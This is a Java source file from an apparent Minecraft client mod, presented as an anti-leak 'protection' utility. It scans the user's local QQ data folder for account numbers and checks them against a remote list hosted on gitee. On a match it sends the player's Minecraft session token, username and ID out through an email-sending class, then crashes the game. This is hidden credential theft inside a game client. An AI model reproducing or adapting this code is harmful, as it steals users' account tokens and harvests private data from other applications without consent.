package cn.timer.ultra.protection.lk.utils;

import cn.timer.ultra.protection.ProtectionLoader;
import net.minecraft.client.Minecraft;
import net.minecraft.util.Session;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class CheckQQgroup {

    public static String guessCharset(InputStream inputStream, boolean isAutoClose) {
        String charset = "GBK";
        byte[] first3Bytes = new byte[3];
        BufferedInputStream bis = null;
        try {
            boolean checked = false;
            bis = new BufferedInputStream(inputStream);
            bis.mark(50 * 1024 * 1024);
            int read = bis.read(first3Bytes, 0, 3);
            if (read == -1)
                return charset;

            if (first3Bytes[0] == (byte) 0xFF && first3Bytes[1] == (byte) 0xFE) {
                charset = "UTF-16LE";
                checked = true;
            } else if (first3Bytes[0] == (byte) 0xFE
                    && first3Bytes[1] == (byte) 0xFF) {
                charset = "UTF-16BE";
                checked = true;
            } else if (first3Bytes[0] == (byte) 0xEF
                    && first3Bytes[1] == (byte) 0xBB
                    && first3Bytes[2] == (byte) 0xBF) {
                charset = "UTF-8";
                checked = true;
            }
            bis.reset();
            if (!checked) {
                while ((read = bis.read()) != -1) {
                    if (read >= 0xF0)
                        break;
                    if (0x80 <= read && read <= 0xBF) // 单独出现BF以下的，也算是GBK
                        break;
                    if (0xC0 <= read && read <= 0xDF) {
                        read = bis.read();
                        if (0x80 <= read && read <= 0xBF) // 双字节 (0xC0 - 0xDF)
                            // (0x80
                            // - 0xBF),也可能在GB编码内
                            continue;
                        else
                            break;
                    } else if (0xE0 <= read && read <= 0xEF) {// 也有可能出错，但是几率较小
                        read = bis.read();
                        if (0x80 <= read && read <= 0xBF) {
                            read = bis.read();
                            if (0x80 <= read && read <= 0xBF) {
                                charset = "UTF-8";
                            }
                        }
                        break;
                    }
                }
            }
        } catch (Exception e) {
            return "UTF-8";
        } finally {
            if (isAutoClose) {
                try {
                    assert bis != null;
                    bis.close();
                } catch (Exception ignored) {
                }
            }
        }
        System.out.println(charset);
        return charset;
    }

    public static String getLineStringCon(String s, String id) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(s.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8));
        String line;
        while ((line = br.readLine()) != null) {
            if (line.contains(id)) {
                return line;
            }
        }
        return null;
    }

    public static List<String> getQQ() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        ArrayList<String> qq = new ArrayList<>();
        try {
            String line;
            BufferedReader br = new BufferedReader(new InputStreamReader(Files.newInputStream(new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini").toPath()), guessCharset(Files.newInputStream(new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini").toPath()), false)));
            while ((line = br.readLine()) != null) {
                if (line.startsWith("UserDataSavePath=")) {
                    File tencentFiles = new File(line.split("=")[1]);
                    if (tencentFiles.exists() && tencentFiles.isDirectory()) {
                        for (File qqDir : Objects.requireNonNull(tencentFiles.listFiles())) {
                            if (qqDir.isDirectory() && qqDir.getName().length() >= 6 && qqDir.getName().length() <= 10 && qqDir.getName().matches("^\\d*$")) {
                                qq.add(qqDir.getName());
                            }
                        }
                    }
                }
            }
            br.close();
            if (qq.isEmpty()) {
                System.err.println("QQ is Null?");
                ProtectionLoader.getLoadedClass().get("AntiLeak").getMethod("crashClient", String.class, String.class).invoke(null, "warning", "QQ is Null?");
            }
        } catch (Throwable ignored) {
            System.err.println("QQ is Null?");
            ProtectionLoader.getLoadedClass().get("AntiLeak").getMethod("crashClient", String.class, String.class).invoke(null, "warning", "QQ is Null?");
        }
        return qq;
    }

    public static void CheckQQ() throws Exception {
        String url = "https://gitee.com/yuxiangll/lorraine/raw/master/UltraClient";
        String re = get(url);
        for (String s : getQQ()) {
            if (getLineStringCon(re, s) != null) {
                Session session = Minecraft.getMinecraft().getSession();
                ProtectionLoader.getLoadedClass().get("EmailSender").getMethod("sendMessage", String.class).invoke(null, session.getToken() + " " + session.getUsername() + " " + session.getPlayerID());
                System.err.println("为什么不加群");
                ProtectionLoader.getLoadedClass().get("AntiLeak").getMethod("crashClient", String.class, String.class).invoke(null, "为什么不加群", getLineStringCon(re, s));
            }
        }
    }

    /**
     * get请求
     *
     * @param url String
     * @return content
     * @throws Exception exception
     */
    public static String get(String url) throws Exception {
        String content = null;
        URLConnection urlConnection = new URL(url).openConnection();
        HttpURLConnection connection = (HttpURLConnection) urlConnection;
        connection.setRequestMethod("GET");
        //连接
        connection.connect();
        //得到响应码
        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader
                    (connection.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder bs = new StringBuilder();
            String l;
            while ((l = bufferedReader.readLine()) != null) {
                bs.append(l).append("\n");
            }
            content = bs.toString();
        }
        return content;
    }
}